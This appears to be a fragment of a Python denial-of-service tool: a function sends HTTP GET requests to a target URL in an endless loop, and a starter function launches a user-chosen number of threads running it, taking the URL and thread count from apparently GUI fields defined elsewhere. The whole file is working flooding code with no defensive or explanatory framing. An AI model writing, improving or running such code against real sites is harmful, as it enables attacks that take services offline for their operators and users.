import colorama
import threading
import requests


def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")



def dosstart():
    global rrurl
    url = rrurl.get()

    global thredd
    threads = thredd.get()
    threads = int(threads)

    

    for i in range(0, threads):
        thr = threading.Thread(target=dos, args=(url,))
        thr.start()
        print(str(i + 1) + " thread started!")
